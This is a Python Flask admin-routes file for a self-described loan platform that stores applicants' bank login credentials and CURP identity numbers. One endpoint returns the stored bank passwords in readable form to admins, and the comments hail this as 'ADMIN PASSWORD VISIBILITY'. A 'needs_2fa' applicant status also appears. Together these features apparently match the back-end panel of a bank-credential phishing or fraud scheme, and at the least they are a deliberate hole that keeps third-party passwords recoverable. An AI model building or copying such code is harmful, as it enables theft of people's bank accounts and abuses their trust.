"""
Admin routes for the loan platform
Handles admin-only functionality including password visibility
"""

from flask import Blueprint, request, jsonify
from src.models import db
from src.models.user import User
from src.models.bank import BankCredential
from src.utils.auth import admin_required
from src.utils.helpers import log_action, generate_response, handle_database_error

admin_bp = Blueprint('admin', __name__)

@admin_bp.route('/applicants', methods=['GET'])
@admin_required
def get_applicants(current_user):
    """Get all applicants (admin only)"""
    try:
        applicants = User.query.filter_by(role='applicant').all()
        
        applicants_data = []
        for applicant in applicants:
            applicant_data = applicant.to_dict()
            applicants_data.append(applicant_data)
        
        return jsonify({'applicants': applicants_data}), 200
        
    except Exception as e:
        print(f"Error getting applicants: {e}")
        return jsonify({'message': 'Error retrieving applicants'}), 500

@admin_bp.route('/applicants/<applicant_id>', methods=['GET'])
@admin_required
def get_applicant(current_user, applicant_id):
    """Get specific applicant details (admin only)"""
    try:
        applicant = User.query.filter_by(id=applicant_id, role='applicant').first()
        
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        applicant_data = applicant.to_dict()
        
        return jsonify(applicant_data), 200
        
    except Exception as e:
        print(f"Error getting applicant: {e}")
        return jsonify({'message': 'Error retrieving applicant'}), 500

# ✅ ADMIN PASSWORD VISIBILITY - Returns passwords for admin users
@admin_bp.route('/applicants/<applicant_id>/credentials', methods=['GET'])
@admin_required
def get_applicant_credentials(current_user, applicant_id):
    """
    Get applicant's bank credentials with passwords visible (admin only)
    ✅ CRITICAL: This allows admins to see passwords
    """
    try:
        # Get applicant info
        applicant = User.query.filter_by(id=applicant_id).first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        # Get credentials
        credentials = BankCredential.get_by_user(applicant_id)
        
        # ✅ ADMIN PASSWORD VISIBILITY: Include passwords for admin
        credentials_data = [cred.to_dict(include_password=True) for cred in credentials]
        
        result = {
            'applicant': applicant.to_dict(),
            'credentials': credentials_data
        }
        
        # Log admin access to sensitive data
        log_action(current_user.id, 'view_credentials', 'bank_credential', applicant_id, 
                  f'Admin viewed credentials for {applicant.name}')
        
        return jsonify(result), 200
        
    except Exception as e:
        print(f"Error getting applicant credentials: {e}")
        return jsonify({'message': 'Error retrieving credentials'}), 500

# ✅ UPDATED STATUS SYSTEM - Supports pending, approved, needs_2fa
@admin_bp.route('/applicants/<applicant_id>/status', methods=['PUT'])
@admin_required
def update_applicant_status(current_user, applicant_id):
    """
    Update applicant status (admin only)
    ✅ SUPPORTS: pending, approved, needs_2fa
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({'message': 'No data provided'}), 400
        
        new_status = data.get('status')
        
        # ✅ UPDATED STATUS VALIDATION
        valid_statuses = ['pending', 'approved', 'needs_2fa']
        if new_status not in valid_statuses:
            return jsonify({
                'message': f'Invalid status. Must be one of: {", ".join(valid_statuses)}'
            }), 400
        
        applicant = User.query.filter_by(id=applicant_id).first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        old_status = getattr(applicant, 'status', 'unknown')
        
        # ✅ BACKWARD COMPATIBLE: Handle missing status column
        try:
            applicant.status = new_status
        except Exception as e:
            print(f"Status update error (possibly missing column): {e}")
            return jsonify({'message': 'Status update failed - database schema issue'}), 500
        
        db.session.commit()
        
        # Log the status change
        log_action(current_user.id, 'status_update', 'user', applicant_id, 
                  f'Status changed from {old_status} to {new_status}')
        
        return jsonify({
            'message': 'Status updated successfully',
            'old_status': old_status,
            'new_status': new_status
        }), 200
        
    except Exception as e:
        print(f"Error updating status: {e}")
        db.session.rollback()
        
        error_message, status_code = handle_database_error(e)
        return jsonify({'message': error_message}), status_code

@admin_bp.route('/applicants/<applicant_id>', methods=['PUT'])
@admin_required
def update_applicant(current_user, applicant_id):
    """Update applicant information (admin only)"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'message': 'No data provided'}), 400
        
        applicant = User.query.filter_by(id=applicant_id).first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        # Update allowed fields
        if 'first_name' in data:
            applicant.first_name = data['first_name']
        if 'last_name' in data:
            applicant.last_name = data['last_name']
        if 'phone' in data:
            applicant.phone = data['phone']
        if 'curp' in data:
            applicant.curp = data['curp']
        if 'is_active' in data:
            applicant.is_active = data['is_active']
        
        db.session.commit()
        
        log_action(current_user.id, 'applicant_update', 'user', applicant_id, 
                  f'Admin updated applicant {applicant.name}')
        
        applicant_data = applicant.to_dict()
        return jsonify({
            'message': 'Applicant updated successfully',
            'applicant': applicant_data
        }), 200
        
    except Exception as e:
        print(f"Error updating applicant: {e}")
        db.session.rollback()
        
        error_message, status_code = handle_database_error(e)
        return jsonify({'message': error_message}), status_code

@admin_bp.route('/applicants/<applicant_id>', methods=['DELETE'])
@admin_required
def delete_applicant(current_user, applicant_id):
    """Delete applicant (admin only)"""
    try:
        applicant = User.query.filter_by(id=applicant_id, role='applicant').first()
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        applicant_name = applicant.name
        
        # Delete related records first (credentials, tickets, etc.)
        BankCredential.query.filter_by(user_id=applicant_id).delete()
        
        # Delete the applicant
        db.session.delete(applicant)
        db.session.commit()
        
        log_action(current_user.id, 'applicant_delete', 'user', applicant_id, 
                  f'Admin deleted applicant {applicant_name}')
        
        return jsonify({'message': 'Applicant deleted successfully'}), 200
        
    except Exception as e:
        print(f"Error deleting applicant: {e}")
        db.session.rollback()
        return jsonify({'message': 'Error deleting applicant'}), 500

@admin_bp.route('/stats', methods=['GET'])
@admin_required
def get_admin_stats(current_user):
    """Get admin dashboard statistics"""
    try:
        # Get user statistics
        total_users = User.query.filter_by(role='applicant').count()
        
        # ✅ UPDATED STATUS SYSTEM statistics
        try:
            approved_users = User.query.filter_by(role='applicant', status='approved').count()
            pending_users = User.query.filter_by(role='applicant', status='pending').count()
            needs_2fa_users = User.query.filter_by(role='applicant', status='needs_2fa').count()
        except Exception as e:
            print(f"Status query error (missing column): {e}")
            # Fallback for missing status column
            approved_users = 0
            pending_users = total_users
            needs_2fa_users = 0
        
        # Get credential statistics
        total_credentials = BankCredential.query.count()
        
        stats = {
            'users': {
                'total': total_users,
                'approved': approved_users,
                'pending': pending_users,
                'needs_2fa': needs_2fa_users
            },
            'credentials': {
                'total': total_credentials
            }
        }
        
        return jsonify(stats), 200
        
    except Exception as e:
        print(f"Error getting admin stats: {e}")
        return jsonify({'message': 'Error retrieving statistics'}), 500

